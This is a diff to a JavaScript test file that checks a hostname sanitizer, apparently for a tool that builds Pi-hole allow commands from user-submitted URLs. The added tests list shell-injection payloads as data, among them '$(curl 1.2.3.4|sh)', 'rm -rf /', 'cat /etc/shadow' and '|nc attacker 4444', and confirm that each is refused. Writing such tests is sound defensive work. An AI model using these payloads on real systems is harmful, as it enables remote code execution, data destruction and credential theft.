@@ -95,7 +95,44 @@ test('extractWhitelistHostname', async (t) => {
     assert.equal(hooks.extractWhitelistHostname(''), '');
   });
 
-  await t.test('unparseable input falls back to a best-effort strip', () => {
-    assert.equal(hooks.extractWhitelistHostname('not a url at all'), 'not a url at all');
+  await t.test('unparseable input is refused, not best-effort stripped', () => {
+    // This previously returned the raw string via a string-slicing fallback.
+    // The output is interpolated into a `pihole allow` command an admin pastes
+    // into a root shell, so input the URL parser rejects is refused outright.
+    assert.equal(hooks.extractWhitelistHostname('not a url at all'), '');
+  });
+
+  await t.test('hostnames carrying shell metacharacters are refused', () => {
+    // The `website` field is unapproved submitter input, and the WHATWG URL
+    // parser accepts every one of these inside a hostname -- so parseability
+    // is not a safety property and the LDH check is what actually holds.
+    const payloads = [
+      'https://example.com$(curl 1.2.3.4|sh)',
+      'https://example.com`id`',
+      'https://example.com;rm -rf /',
+      'https://example.com"; cat /etc/shadow; "',
+      'https://example.com|nc attacker 4444',
+      'https://example.com&&reboot',
+      'https://exa mple.com',
+      'https://example.com' + String.fromCharCode(10) + 'rm -rf /',
+    ];
+    for (const payload of payloads) {
+      assert.equal(hooks.extractWhitelistHostname(payload), '', `expected refusal for ${JSON.stringify(payload)}`);
+    }
+  });
+
+  await t.test('a refused hostname yields no command at all, not a partial one', () => {
+    // End to end through the chain that actually reaches the clipboard.
+    const host = hooks.extractWhitelistHostname('https://example.com$(curl 1.2.3.4|sh)');
+    const domains = hooks.deriveWhitelistCandidates(host);
+    // Length, not deepEqual: the array comes from the vm sandbox's realm, so its
+    // prototype is a different Array and deepStrictEqual fails on identity.
+    assert.equal(domains.length, 0);
+    assert.equal(hooks.buildWhitelistCommand('12345', 'Internet Exchange', domains), '');
+  });
+
+  await t.test('single-label and trailing-dot hosts are refused', () => {
+    assert.equal(hooks.extractWhitelistHostname('localhost'), '');
+    assert.equal(hooks.extractWhitelistHostname('https://example.com.'), '');
   });
 });
